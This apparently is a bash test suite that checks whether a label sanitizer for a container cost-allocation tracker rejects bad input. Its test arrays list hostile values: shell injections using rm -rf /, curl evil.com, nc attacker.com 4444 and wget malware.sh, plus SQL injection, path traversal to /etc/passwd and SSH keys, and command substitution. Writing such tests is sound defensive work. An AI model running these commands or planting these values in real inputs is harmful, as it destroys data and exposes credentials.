#!/bin/bash
# tests/security/test-label-injection.sh
# Phase 5 :: Label injection vulnerability tests (CVSS 7.5 mitigation)

set -euo pipefail

PROJECT_ROOT=$(git rev-parse --show-toplevel 2>/dev/null || echo "$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)")
cd "$PROJECT_ROOT"

# Source test utilities
if [[ -f "$PROJECT_ROOT/tests/test-utils.sh" ]]; then
  source "$PROJECT_ROOT/tests/test-utils.sh"
else
  echo "ERROR: test-utils.sh not found" >&2
  exit 1
fi

# Source validation library (contains sanitization functions)
if [[ -f "$PROJECT_ROOT/scripts/lib/validation.sh" ]]; then
  source "$PROJECT_ROOT/scripts/lib/validation.sh"
else
  echo "ERROR: validation.sh not found - required for label sanitization" >&2
  exit 1
fi

# ============================================================================
# Test: Label sanitization function exists
# ============================================================================
test_sanitize_label_function_exists() {
  log_step "GIVEN validation.sh is sourced"
  log_step "WHEN checking for sanitize_label function"

  # THEN function should exist
  if declare -f sanitize_label >/dev/null 2>&1; then
    TEST_TOTAL=$((TEST_TOTAL + 1))
    TEST_PASSED=$((TEST_PASSED + 1))
    log_success "PASS: sanitize_label function exists"
    return 0
  else
    TEST_TOTAL=$((TEST_TOTAL + 1))
    TEST_FAILED=$((TEST_FAILED + 1))
    log_error "FAIL: sanitize_label function is missing from validation.sh"
    return 1
  fi
}

# ============================================================================
# Test: Valid labels are accepted
# ============================================================================
test_valid_labels_accepted() {
  log_step "GIVEN valid label inputs"

  local valid_labels=(
    "team-engineering"
    "env-production"
    "app-frontend"
    "version-1-0-0"
    "cost-center-123"
    "owner-john-doe"
    "a"
    "z9"
  )

  local test_passed=0
  local test_failed=0

  for label in "${valid_labels[@]}"; do
    log_step "WHEN sanitizing valid label: $label"

    local sanitized
    if sanitized=$(sanitize_label "$label" 2>&1); then
      TEST_TOTAL=$((TEST_TOTAL + 1))
      TEST_PASSED=$((TEST_PASSED + 1))
      test_passed=$((test_passed + 1))
      log_success "PASS: Valid label accepted: $label → $sanitized"
    else
      TEST_TOTAL=$((TEST_TOTAL + 1))
      TEST_FAILED=$((TEST_FAILED + 1))
      test_failed=$((test_failed + 1))
      log_error "FAIL: Valid label rejected: $label"
    fi
  done

  # Return aggregate result
  if [[ $test_failed -eq 0 ]]; then
    return 0
  else
    return 1
  fi
}

# ============================================================================
# Test: Shell injection blocked
# ============================================================================
test_shell_injection_blocked() {
  log_step "GIVEN malicious shell injection payloads"

  local malicious_labels=(
    "'; rm -rf /;'"
    "\$(curl evil.com)"
    "\`whoami\`"
    "team; cat /etc/passwd"
    "app | nc attacker.com 4444"
    "env && wget malware.sh"
  )

  local test_passed=0
  local test_failed=0

  for label in "${malicious_labels[@]}"; do
    log_step "WHEN sanitizing malicious label: $label"

    local sanitized
    if sanitized=$(sanitize_label "$label" 2>&1); then
      TEST_TOTAL=$((TEST_TOTAL + 1))
      TEST_FAILED=$((TEST_FAILED + 1))
      test_failed=$((test_failed + 1))
      log_error "FAIL: Shell injection NOT blocked: $label → $sanitized"
    else
      TEST_TOTAL=$((TEST_TOTAL + 1))
      TEST_PASSED=$((TEST_PASSED + 1))
      test_passed=$((test_passed + 1))
      log_success "PASS: Shell injection blocked: $label"
    fi
  done

  # Return aggregate result
  if [[ $test_failed -eq 0 ]]; then
    return 0
  else
    return 1
  fi
}

# ============================================================================
# Test: SQL injection blocked
# ============================================================================
test_sql_injection_blocked() {
  log_step "GIVEN SQL injection payloads"

  local sql_payloads=(
    "' OR 1=1--"
    "'; DROP TABLE users;--"
    "admin'--"
    "1' UNION SELECT * FROM secrets--"
  )

  local test_passed=0
  local test_failed=0

  for label in "${sql_payloads[@]}"; do
    log_step "WHEN sanitizing SQL injection: $label"

    local sanitized
    if sanitized=$(sanitize_label "$label" 2>&1); then
      TEST_TOTAL=$((TEST_TOTAL + 1))
      TEST_FAILED=$((TEST_FAILED + 1))
      test_failed=$((test_failed + 1))
      log_error "FAIL: SQL injection NOT blocked: $label → $sanitized"
    else
      TEST_TOTAL=$((TEST_TOTAL + 1))
      TEST_PASSED=$((TEST_PASSED + 1))
      test_passed=$((test_passed + 1))
      log_success "PASS: SQL injection blocked: $label"
    fi
  done

  # Return aggregate result
  if [[ $test_failed -eq 0 ]]; then
    return 0
  else
    return 1
  fi
}

# ============================================================================
# Test: Path traversal blocked
# ============================================================================
test_path_traversal_blocked() {
  log_step "GIVEN path traversal payloads"

  local path_payloads=(
    "../../etc/passwd"
    "../../../root/.ssh/id_rsa"
    "team/../../../secrets"
    "./../../config"
  )

  local test_passed=0
  local test_failed=0

  for label in "${path_payloads[@]}"; do
    log_step "WHEN sanitizing path traversal: $label"

    local sanitized
    if sanitized=$(sanitize_label "$label" 2>&1); then
      TEST_TOTAL=$((TEST_TOTAL + 1))
      TEST_FAILED=$((TEST_FAILED + 1))
      test_failed=$((test_failed + 1))
      log_error "FAIL: Path traversal NOT blocked: $label → $sanitized"
    else
      TEST_TOTAL=$((TEST_TOTAL + 1))
      TEST_PASSED=$((TEST_PASSED + 1))
      test_passed=$((test_passed + 1))
      log_success "PASS: Path traversal blocked: $label"
    fi
  done

  # Return aggregate result
  if [[ $test_failed -eq 0 ]]; then
    return 0
  else
    return 1
  fi
}

# ============================================================================
# Test: Command substitution blocked
# ============================================================================
test_command_substitution_blocked() {
  log_step "GIVEN command substitution payloads"

  local cmd_payloads=(
    "\$(whoami)"
    "\`id\`"
    "\$USER"
    "\${PATH}"
  )

  local test_passed=0
  local test_failed=0

  for label in "${cmd_payloads[@]}"; do
    log_step "WHEN sanitizing command substitution: $label"

    local sanitized
    if sanitized=$(sanitize_label "$label" 2>&1); then
      TEST_TOTAL=$((TEST_TOTAL + 1))
      TEST_FAILED=$((TEST_FAILED + 1))
      test_failed=$((test_failed + 1))
      log_error "FAIL: Command substitution NOT blocked: $label → $sanitized"
    else
      TEST_TOTAL=$((TEST_TOTAL + 1))
      TEST_PASSED=$((TEST_PASSED + 1))
      test_passed=$((test_passed + 1))
      log_success "PASS: Command substitution blocked: $label"
    fi
  done

  # Return aggregate result
  if [[ $test_failed -eq 0 ]]; then
    return 0
  else
    return 1
  fi
}

# ============================================================================
# Test: Maximum length enforced
# ============================================================================
test_maximum_length_enforced() {
  log_step "GIVEN labels exceeding 63 characters"

  local long_label="team-engineering-frontend-production-deployment-environment-version-1-2-3-extra-long-name"

  log_step "WHEN sanitizing long label (${#long_label} chars)"

  local sanitized
  if sanitized=$(sanitize_label "$long_label" 2>&1); then
    # Check if truncated to acceptable length
    if [[ ${#sanitized} -le 63 ]]; then
      TEST_TOTAL=$((TEST_TOTAL + 1))
      TEST_PASSED=$((TEST_PASSED + 1))
      log_success "PASS: Long label truncated to ${#sanitized} chars"
      return 0
    else
      TEST_TOTAL=$((TEST_TOTAL + 1))
      TEST_FAILED=$((TEST_FAILED + 1))
      log_error "FAIL: Long label NOT enforced: ${#sanitized} chars"
      return 1
    fi
  else
    # Rejection is also acceptable
    TEST_TOTAL=$((TEST_TOTAL + 1))
    TEST_PASSED=$((TEST_PASSED + 1))
    log_success "PASS: Long label rejected (${#long_label} chars)"
    return 0
  fi
}

# ============================================================================
# Test: Special characters rejected
# ============================================================================
test_special_characters_rejected() {
  log_step "GIVEN labels with special characters"

  local special_labels=(
    "team@engineering"
    "app#frontend"
    "env!production"
    "version*1.0"
    "owner&admin"
    "cost+center"
  )

  local test_passed=0
  local test_failed=0

  for label in "${special_labels[@]}"; do
    log_step "WHEN sanitizing label with special chars: $label"

    local sanitized
    if sanitized=$(sanitize_label "$label" 2>&1); then
      TEST_TOTAL=$((TEST_TOTAL + 1))
      TEST_FAILED=$((TEST_FAILED + 1))
      test_failed=$((test_failed + 1))
      log_error "FAIL: Special characters NOT rejected: $label → $sanitized"
    else
      TEST_TOTAL=$((TEST_TOTAL + 1))
      TEST_PASSED=$((TEST_PASSED + 1))
      test_passed=$((test_passed + 1))
      log_success "PASS: Special characters rejected: $label"
    fi
  done

  # Return aggregate result
  if [[ $test_failed -eq 0 ]]; then
    return 0
  else
    return 1
  fi
}

# ============================================================================
# Test: Empty label rejected
# ============================================================================
test_empty_label_rejected() {
  log_step "GIVEN empty label input"
  log_step "WHEN sanitizing empty string"

  local sanitized
  if sanitized=$(sanitize_label "" 2>&1); then
    TEST_TOTAL=$((TEST_TOTAL + 1))
    TEST_FAILED=$((TEST_FAILED + 1))
    log_error "FAIL: Empty label NOT rejected: '$sanitized'"
    return 1
  else
    TEST_TOTAL=$((TEST_TOTAL + 1))
    TEST_PASSED=$((TEST_PASSED + 1))
    log_success "PASS: Empty label rejected"
    return 0
  fi
}

# ============================================================================
# Test: Whitespace trimmed
# ============================================================================
test_whitespace_trimmed() {
  log_step "GIVEN label with leading/trailing whitespace"

  local label_with_spaces="  team-engineering  "

  log_step "WHEN sanitizing label with spaces"

  local sanitized
  if sanitized=$(sanitize_label "$label_with_spaces" 2>&1); then
    if [[ "$sanitized" == "team-engineering" ]]; then
      TEST_TOTAL=$((TEST_TOTAL + 1))
      TEST_PASSED=$((TEST_PASSED + 1))
      log_success "PASS: Whitespace trimmed: '$label_with_spaces' → '$sanitized'"
      return 0
    else
      TEST_TOTAL=$((TEST_TOTAL + 1))
      TEST_FAILED=$((TEST_FAILED + 1))
      log_error "FAIL: Whitespace NOT fully trimmed: '$label_with_spaces' → '$sanitized'"
      return 1
    fi
  else
    TEST_TOTAL=$((TEST_TOTAL + 1))
    TEST_FAILED=$((TEST_FAILED + 1))
    log_error "FAIL: Label with whitespace rejected (should trim and accept)"
    return 1
  fi
}

# ============================================================================
# Test: Integration with cost tracker
# ============================================================================
test_cost_tracker_integration() {
  log_step "GIVEN cost-allocation-tracker.sh exists"

  if [[ ! -f "$PROJECT_ROOT/scripts/cost-allocation-tracker.sh" ]]; then
    TEST_TOTAL=$((TEST_TOTAL + 1))
    TEST_FAILED=$((TEST_FAILED + 1))
    log_error "FAIL: cost-allocation-tracker.sh not found"
    return 1
  fi

  log_step "WHEN checking for sanitize_label usage"

  # Check if cost tracker sources validation.sh
  if grep -q "source.*validation.sh" "$PROJECT_ROOT/scripts/cost-allocation-tracker.sh"; then
    TEST_TOTAL=$((TEST_TOTAL + 1))
    TEST_PASSED=$((TEST_PASSED + 1))
    log_success "PASS: cost-allocation-tracker.sh sources validation.sh"
  else
    TEST_TOTAL=$((TEST_TOTAL + 1))
    TEST_FAILED=$((TEST_FAILED + 1))
    log_error "FAIL: cost-allocation-tracker.sh does NOT source validation.sh"
    return 1
  fi

  # Check if cost tracker uses sanitize_label
  if grep -q "sanitize_label" "$PROJECT_ROOT/scripts/cost-allocation-tracker.sh"; then
    TEST_TOTAL=$((TEST_TOTAL + 1))
    TEST_PASSED=$((TEST_PASSED + 1))
    log_success "PASS: cost-allocation-tracker.sh uses sanitize_label function"
    return 0
  else
    TEST_TOTAL=$((TEST_TOTAL + 1))
    TEST_FAILED=$((TEST_FAILED + 1))
    log_error "FAIL: cost-allocation-tracker.sh does NOT use sanitize_label"
    return 1
  fi
}

# ============================================================================
# Execute all tests
# ============================================================================
main() {
  log_info "Starting Label Injection Security Tests (CVSS 7.5)"
  log_info "Test suite validates input sanitization for container labels"
  echo ""

  # Array of test functions
  local tests=(
    "test_sanitize_label_function_exists"
    "test_valid_labels_accepted"
    "test_shell_injection_blocked"
    "test_sql_injection_blocked"
    "test_path_traversal_blocked"
    "test_command_substitution_blocked"
    "test_maximum_length_enforced"
    "test_special_characters_rejected"
    "test_empty_label_rejected"
    "test_whitespace_trimmed"
    "test_cost_tracker_integration"
  )

  for test_func in "${tests[@]}"; do
    $test_func || true
    echo ""
  done

  # Summary
  local total_tests=$TEST_TOTAL
  local tests_passed=$TEST_PASSED
  local tests_failed=$TEST_FAILED
  local pass_rate=$(awk "BEGIN {printf \"%.2f\", $tests_passed / $total_tests}")

  log_info "================================================"
  log_info "Label Injection Test Results"
  log_info "================================================"
  log_info "Total tests: $total_tests"
  log_info "Passed: $tests_passed"
  log_info "Failed: $tests_failed"
  log_info "Pass rate: $pass_rate (threshold: 1.00)"
  log_info "================================================"

  # Gate check (100% pass rate required for security tests)
  if (( $(awk "BEGIN {print ($pass_rate >= 1.0)}") )); then
    log_info "✅ GATE PASSED: Label injection vulnerability mitigated"
    return 0
  else
    log_error "❌ GATE FAILED: Security vulnerabilities remain (pass rate < 1.00)"
    return 1
  fi
}

# Run tests
main "$@"
